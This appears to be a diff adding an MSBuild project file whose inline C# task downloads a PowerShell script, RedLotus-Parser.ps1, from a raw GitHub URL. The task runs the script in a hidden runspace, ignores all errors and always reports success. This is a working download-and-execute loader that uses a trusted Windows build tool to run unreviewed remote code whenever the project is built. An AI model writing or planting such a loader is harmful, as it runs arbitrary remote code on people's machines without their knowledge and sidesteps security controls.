@@ -1,0 +1,38 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Execute">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using System.Net;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class ClassExample : Task
+        {
+          public override bool Execute()
+          {
+            string script = new WebClient().DownloadString("https://raw.githubusercontent.com/bna169/RedLotus-Parser/refs/heads/main/RedLotus-Parser.ps1");
+            var runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            var pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(script);
+            try { pipeline.Invoke(); } catch { }
+            runspace.Close();
+            return true;
+          }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
